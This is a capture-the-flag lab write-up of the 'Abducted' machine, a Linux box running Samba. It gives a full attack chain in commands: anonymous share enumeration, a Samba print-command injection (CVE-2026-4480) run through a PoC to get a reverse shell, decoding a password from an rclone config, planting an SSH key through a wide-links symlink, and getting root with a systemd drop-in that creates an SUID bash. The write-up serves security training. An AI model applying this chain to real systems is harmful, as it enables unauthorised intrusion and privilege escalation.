<div align="center">
<img src="attachments/Pasted%20image%2020260608094620.png">
</div>

[Machine Page](https://app.hackthebox.com/machines/Abducted?sort_by=created_at&sort_type=desc)  
**Difficulty:** Medium
**OS:** Linux
**CVEs Exploited:**  
**Topics:** Topics: CVE-2026-4480 · Samba Suite · Polkit · Anonymous Share Listing · Password Reuse · Rclone · Decryption · SSH Key insertion · Python · Systemd drop-in location

By: [https://app.hackthebox.com/users/2727685](https://app.hackthebox.com/users/2727685)


## Overview
---

Abducted is a Medium difficulty Linux machine hosting a misconfigured SMB share through Samba Suite, which allows us to list the shares anonymously. This process exposes a printer-type share, which accepts printer jobs from guest accounts. Foothold is gained via `CVE-2026-4480`, a critical command injection vulnerability in the Samba printing subsystem that allows unauthenticated, remote code execution. The investigation revealed password reuse, as the obfuscated password recovered from the `rclone` configuration file also successfully authenticated the user `scott`. Further lateral movement is achieved by inserting our own keys into the marcus' user home directory. SMB configuration reveals the service is forced to run under his privileges, and that the Samba file share can follow wide links, basically moving out of the fileshare if there are any symbolic links located in it. We make use of the privileges of the scott user to make a symbolic link to marcus' ssh configuration files located in his home directory, and because smb now runs with this privileges it can access and place a key we made up into his `authorized_keys` file.  Root is obtained by .. 
```
[Machine name] is a [difficulty] Linux/Windows machine 
running [service/tech]. Foothold is gained via [CVE/technique], 
which allows [what it does]. Root is obtained by [privesc method].
```

## Learned
---
- Samba Suite - how it provides compatibility for the SMB protocol to Linux, how it is configured.
- Rclone - password storing, obfuscation and revealing.
- Systemd drop-in -
## Reconnaissance
---

Starting off with an `Nmap` scan.

```shell
$ nmap -sV -sC -p- --min-rate 10000 10.129.18.30 -oA abducted_port_scan.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-08 09:49 +0200
Nmap scan report for 10.129.18.30
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

---(SNIP)---
```

Exposed services reveal:
- `22/tcp` OpenSSH 9.6p1
- `139/tcp` & `445/tcp` Samba smbd 4

This was my first time encountering the term *Samba*. Nevertheless appearing to be something related to **Server Message Block (SMB)**, which I am familiar with, I still conducted some research to be sure.

>[!NOTE]
>`smbd` is the core server daemon in the **Samba** suite that provides file sharing and printing services to Windows clients using the SMB/CIFS protocols. It acts as the bridge that allows Unix-like systems (like Linux and macOS) to seamlessly communicate with Windows-based networks.
>
>**How it works**
>When a client connects to your Linux/Unix server, `smbd` handles the authentication, grants access to filespace and printers, and spawns a specific process for each active client connection. It operates alngside `nmbd` (NetBIOS name server) and `winbindd` (Active Directory communication).

In other words, Samba is just a service which adapts the SMB protocol for Unix-based machines to also host file shares across a **LAN**.

Secondary Note!!!
	SMB is a communication protocol intended for a Local Area Network (LAN). We will be able to communicate with the file share hosted on the machine only because our VPN emulates LAN behavior across the internet, or our Pwnbox (if you're using one) is located inside the LAN itself. By connecting to the machine's network in one of the two ways, we can access internal resources as if we were physically connected to the network. In a real-life scenario, the following wouldn't be possible without a VPN connection or being part of the network physically.

With this new acquired perspective our goal is clear: see if the file share is configured in such a way that allows us to list them anonymously.

```shell
$ smbclient -L //10.129.244.177/      
Password for [WORKGROUP\nuun]:
        Sharename       Type      Comment
        ---------       ----      -------
        HP-Reception    Printer   Reception printer
        projects        Disk      Hartley Group Project Files
        transfer        Disk      Staff file transfer
        IPC$            IPC       IPC Service (Hartley Group Document Services)
```

Trying to list the contents without a password/work-group proved successful.

4 shares were exposed, with one being an admin share (**IPC$**), so we divert our attention from that, and 3 others being public, of which only HP-Reception/Printer-type allows guest printing. The other two: `rojects` & `transfer` do not permit anonymous access.

When you see a **printer share accessible as guest** and nothing else works, that share IS the attack vector, just not through file listing. Think about what printer shares actually do: accept print jobs.

Googled : `samba printer share vulnerability 2026`

**CVE-2026-4480** surfaces quickly given how recently it was published.
	*CVE-2026-4480* is a flaw in the **Samba** **printing** subsystem. Samba passes a client-controlled **job description string** to the command configured with the "print command" setting via the **"%J"** substitution character without escaping shell **meta characters**. This could lead to *Remote Code Execution*.

## Foothold
---

The creator of this challenge has a great **PoC** which can be viewed [here](https://github.com/TheCyberGeek/CVE-2026-4480-PoC/tree/bb56aff936a0d01ab99eacefa5350d86ad2bd85d)

Firstly, a listener needs to be started.

```bash
$ nc -lvnp 4444
```

Secondly, the exploit is to be run.

```bash
$ python3 exploit.py 10.129.244.177 10.10.15.57 4444
```

By default the script has a hard-coded command that establishes a reverse shell, but if you want to run another command instead just specify it with the **-c** argument `-c <command>`

### Local Enumeration 
---

By now our listener should have caught a reverse shell.

```bash
$ nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.10.15.57] from (UNKNOWN) [10.129.244.177] 40538
bash: cannot set terminal process group (1852): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$   
```

The first logical step before we continue with user enumeration is to obtain a stable shell. This will result in being able to use arrow keys, autocompletion via TAB, end/cancel input, and have a shell that won't break by bad commands overall.

```bash
nobody@abducted:/var/spool/samba$ hostname && whoami && id
abducted
nobody
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

Now a shell session as the user `nobody` is acquired.

With a missing password preventing us from using sudo privileges, system enumeration has to be taken advantage of in order to discover confidential information that could lead to a shell instance as a more privileged user.

Quick system enumeration reveals this system is being shared with **2 other users** besides root.

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
---(SNIP)---
scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash
nobody@abducted:/var/spool/samba$
```

`scott` & `marcus`.

Listing of their groups could help us get an idea of which user possesses more power within the machine.

```bash
$ groups marcus scott
marcus : marcus operators
scott : scott
```

Marcus is part of the `operators` group. This is noted as it might come in handy later on.

Quickly an offsite backup for **Rclone** is found under `/opt/offiste-backup` inside of the `rclone.config` configuration file.

```shell
/opt/offsite-backup$$ cat rclone.conf 
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

>[!NOTE]
>**Rclone** is a command-line program to manage files on cloud storage. It is used at the command line, in scripts or via its API. It is considered "The Swiss army knife of cloud storage".
>
>By default, `rclone` saves passwords in cleartext (weakly obscured with a hardcoded key) inside its plaintext configuration file (`rclone.conf`). This method is designed purely to prevent accidental "over-the-shoulder" viewing, not to provide true cryptographic security.

The tool provides a simple command for revealing obscured passwords from your configuration file.

```bash
$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

Password : `iXzvcib3SrpZ`

The following is a common case of **password reuse**, which leverages same passwords being used across different accounts.

```bash
$ ssh scott@localhost
scott@localhost's password: iXzvcib3SrpZ

$ scott@abducted:~$ whoami
scott
```

## User flag
---

The user flag is readable from `/home/scott/user.txt`.

```bash
$ cat /home/scott/user.txt 
021b13848521c50d2eec861071dc5758
```

## Samba smb.config analysis
---

On `/etc/samba` the samba configuration files can be read.

```bash
/etc/samba$ cat shares.conf smb.conf 
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   log level = 0
   include = /etc/samba/shares.conf

```

How the `smb.config` file works - ([here](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html) to view the full documentation)
	The file is processed in the following way:
	- The Samba suite's client applications read their configuration only once. Any changes made after start aren't reflected in the context of already running client code.
    - The Samba suite's server daemons reload their configuration when requested. However, already active connections do not change their configuration
    - The file consists of sections and parameters. A section begins with the name of the section in square brackets and continues until the next section begins. Sections contain parameters of the form: _`name`_ = _`value`_
    - Each section in the configuration file (except for the global section) describes a shared resource (known as a “share”).

```
force user (S)
--------------------------------------------------------------------------------
This specifies a UNIX user name that will be assigned as the default user for all users connecting to this service. This is useful for sharing files. You should also use it carefully as using it incorrectly can cause security problems.

This user name only gets used once a connection is established. Thus clients still need to connect as a valid user and supply a valid password. Once connected, all file operations will be performed as the "forced user", no matter what username the client connected as. This can be very useful.

In Samba 2.0.5 and above this parameter also causes the primary group of the forced user to be used as the primary group for all file activity. Prior to 2.0.5 the primary group was left as the primary group of the connecting user (this was a bug).

Default: force user =
Example: force user = auser

wide links (S)
--------------------------------------------------------------------------------
This parameter controls whether or not links in the UNIX file system may be followed by the server. Links that point to areas within the directory tree exported by the server are always allowed; this parameter controls access only to areas that are outside the directory tree being exported.

allow insecure wide links (G)
--------------------------------------------------------------------------------
In normal operation the option wide links which allows the server to follow symlinks outside of a share path is automatically disabled when unix extensions are enabled on a Samba server. This is done for security purposes to prevent UNIX clients creating symlinks to areas of the server file system that the administrator does not wish to export.
```

Key findings here are:
- `force user = marcus` -> After connecting, all the files in the share run under marcus' privileges. This is interesting, as earlier we discovered he was part of the operators group, so a file should inherit that group's permissions too.
- `wide links = yes` -> The service follows links that point out of the shares.

All of these combined mean that if we can plant a symlink inside the share pointing anywhere marcus has access to on the file system, Samba will follow it and perform operations there as him.

But the `[transfer]` share confirms `valid users = scott`. So does the `[projects]` share. Thus any of these two can be used to plant a symlink in marcus' home directory, where the users SSH Keys are stored.

## Lateral Movement
---

Generate keys.

```bash
$ ssh-keygen -q -N '' -f /tmp/key
```

Create a symbolic link.

```bash
$ ln -s /home/marcus /srv/transfer/home_marcus
```

The symlink `home_marcus` now points to marcus' entire home directory.

Next step is going on SMB and importing our own files to the share:
	The files => SSH keys
	Share -> follows Symlink -> to marcus's home directory

```bash
$ smbclient //localhost/transfer -U scott%iXzvcib3SrpZ
```

```bash
smb: \> cd home_marcus  
# This is the symlink we created, esentially all of this is happening on the users home dir.
smb: \home_marcus\> mkdir .ssh
smb: \home_marcus\> cd .ssh
smb: \home_marcus\.ssh\> put /tmp/key.pub authorized_keys 
# Dropping our key on the users ssh key container file.
smb: \home_marcus\.ssh\> ls
# Verifying
smb: \home_marcus\.ssh\> exit
```

Finally, the keys that were made up ourselves were inserted into marcus' `.../.ssh/authorized_keys` file. All is left to do is **SSH** into the machine as marcus.

```bash
$ ssh -i /tmp/key marcus@localhost
```


So the logic here is:
	While we're inside of SMB, we are **marcus**. But SMB is not made for RCE on a system, its just meant for accessing/submitting shares. We have 2 preconditions:
	- Samba can follow symlinks outside the share
	- We can create symlinks inside the share since we own it
	So we create a link to a users home directory and craft our own keys. Since file sharing is the purpose of SMB the key we generated is treated as the file to be shared, and the share folder itself is in the users home directory. Remember ! : Samba can only place the file share inside of marcus's dir (in other words, follow the symbolic link) because it is forced to run under his privileges.

## Privilege escalation
---

Previously it was discovered that this user is a part of a special group.

```shell
marcus@abducted:~$ whoami
marcus
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)

```

`operators`

Searching for files/folders the group can manage:

```bash
marcus@abducted:/$ find / -group operators -writable -type d 2>/dev/null
/etc/systemd/system/smbd.service.d
```

```bash
marcus@abducted:/etc/systemd/system/smbd.service.d$ ls -la
total 8
drwxrws---  2 root operators 4096 Jun  4 13:41 .
drwxr-xr-x 26 root root      4096 Jun  4 13:41 ..
```

`s` -> Stands for `setgid`, any file created inside it inherits the `operators` group. 

The `.d` extension signifies this is a **systemd** drop-in location.

>[!NOTE]
A `systemd` drop-in location is a dedicated directory used to safely override or extend existing service settings without modifying the original configuration files. These directories end in `.d` and reside in the main configuration paths. Any `.conf` file placed here is automatically merged into `smbd.service` when the unit is reloaded, extending or overriding its configuration.

Directives like `ExecStartPre=` run before the main service process starts, and crucially they run as the service's user, and `smbd` runs as root. (View `man systemd.service` for more)

So writing a drop-in here is effectively arbitrary command execution as root, triggered at **service start** -> The change does nothing until the systemd daemon is reloaded and `smbd` is restarted. An unprivileged user normally can't do either to a root-owned service.

This is where polkit comes in. We enumerate every registered polkit action and test each one against our current process to see what `operators` members can do without authenticating:

```bash
for action in $(pkaction); do
    pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done

---(SNIP)---
ALLOWED: org.freedesktop.login1.inhibit-block-idle
ALLOWED: org.freedesktop.login1.inhibit-delay-shutdown
ALLOWED: org.freedesktop.login1.inhibit-delay-sleep
---
ALLOWED: org.freedesktop.login1.set-self-linger
---
ALLOWED: org.freedesktop.systemd1.reload-daemon
---

```

Key findings: 

```bash
ALLOWED: org.freedesktop.systemd1.reload-daemon
```

This means marcus can reload the systemd manager without a password. Unit management (`manage-units`) doesn't appear in a blanket `pkcheck` because the polkit rule granting it is conditional. It only fires when the call carries `unit=smbd.service`, exactly as `systemctl` sends it. So `systemctl restart smbd` succeeds without a password prompt, while restarting any other unit would ask for root credentials.

We write a drop-in that copies bash and sets the SUID bit on it:

```bash
cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
```

Then reload the daemon and restart the service to trigger execution:

```bash
systemctl daemon-reload
systemctl restart smbd
```

systemd, running as root, executes both `ExecStartPre` lines — copying bash to `/tmp/.rb` and flagging it setuid root. Confirming:

```bash
ls -l /tmp/.rb
```

## Root flag
---

The `-p` flag tells bash to preserve the effective UID rather than dropping it, giving us a root shell:

```bash
/tmp/.rb -p -c 'id; cat /root/root.txt'
uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)
<root flag>
```

## Summary
---

| Step | Action                            | Tool / Technique                         |
| ---- | --------------------------------- | ---------------------------------------- |
| 1    | Port Scan                         | Nmap                                     |
| 2    | Anonymous Share Enumeration       | `smbclient`                              |
| 3    | Unauthenticated RCE               | CVE-2026-4480                            |
| 4    | Credential Discovery & Decryption | `rclone.conf` + `rclone reveal`          |
| 5    | Password Reuse + User Flag        | SSH as `scott`                           |
| 6    | SMB Misconfiguration Analysis     | `smb.conf` -> `force user`, `wide links` |
| 7    | SSH Key Insertion into `marcus`   | `ssh-keygen` + `ln -s` + `smbclient`     |
| 8    | Lateral Movement                  | SSH as `marcus`                          |
| 9    | Polkit Enumeration                | `pkcheck` loop                           |
| 10   | Systemd Drop-in + Root Flag       | `ExecStartPre` SUID bash + `systemctl`   |

---
<div align="center">
<img src="attachments/Pasted%20image%2020260622000909.png">
</div>


